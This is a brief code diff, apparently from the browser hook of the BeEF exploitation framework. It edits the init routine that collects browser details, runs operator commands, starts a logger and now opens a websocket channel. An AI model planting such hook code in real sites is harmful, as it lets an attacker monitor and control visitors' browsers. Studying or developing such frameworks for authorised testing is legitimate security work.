@@ -61,9 +61,12 @@ window.onclose = function(event) {
 function beef_init() {
   if (!beef.pageIsLoaded) {
     beef.pageIsLoaded = true;
-	beef.net.browser_details()
+	beef.net.browser_details();
     beef.updater.execute_commands();
     beef.updater.check();
     beef.logger.start();
+    /*@TODO we need a check here*/
+    beef.websocket.start();
   }
+
 }
